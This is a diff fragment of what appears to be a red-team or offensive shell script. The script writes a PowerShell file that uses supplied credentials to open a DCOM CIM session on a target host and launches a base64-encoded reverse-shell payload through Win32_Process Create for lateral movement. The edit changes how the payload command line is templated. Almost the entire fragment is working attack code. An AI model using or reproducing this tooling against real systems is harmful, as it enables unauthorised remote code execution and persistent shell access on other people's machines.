@@ -9,7 +9,7 @@ echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;" >
 echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;" >> lateral-movement-wmi.ps1; \
 echo "\$Options = New-CimSessionOption -Protocol DCOM;" >> lateral-movement-wmi.ps1; \
 echo "\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options;" >> lateral-movement-wmi.ps1; \
-echo "\$Command = 'powershell -nop -w hidden -e <%echo $(esh payloads/revshell-windows-powershell-oneliner-base64encoded)%>';" >> lateral-movement-wmi.ps1; \
+echo "\$Command = '<%echo $(esh payloads/revshell-windows-powershell-oneliner-base64encoded)%>';" >> lateral-movement-wmi.ps1; \
 echo "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command}" >> lateral-movement-wmi.ps1; \
 
 mkdir -p packstation/outbound; mv lateral-movement-wmi.ps1 packstation/outbound/; \
